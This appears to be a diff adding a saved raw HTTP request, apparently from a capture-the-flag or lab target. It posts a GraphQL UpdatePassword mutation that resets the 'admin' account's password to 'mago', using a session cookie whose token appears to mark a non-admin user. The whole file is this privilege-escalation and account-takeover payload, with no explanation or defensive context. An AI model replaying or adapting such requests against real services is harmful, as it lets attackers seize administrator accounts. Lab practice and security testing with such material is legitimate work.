@@ -1,0 +1,14 @@
+POST /graphql HTTP/1.1
+Host: 83.136.255.40:32757
+Content-Length: 178
+Accept-Language: es-ES,es;q=0.9
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
+Content-Type: application/json
+Accept: */*
+Origin: http://83.136.255.40:32757
+Referer: http://83.136.255.40:32757/dashboard
+Accept-Encoding: gzip, deflate, br
+Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1hZ28iLCJpc19hZG1pbiI6MCwiaWF0IjoxNzI3MTE2NjI2fQ.mTMkFCXgBEYtn2p2m7aAjYTlC02oLJEcDFPUcbGrstg
+Connection: keep-alive
+
+{"query":"mutation($username: String!, $password: String!){UpdatePassword(username: $username, password: $password){message}}","variables":{"username":"admin","password":"mago"}}
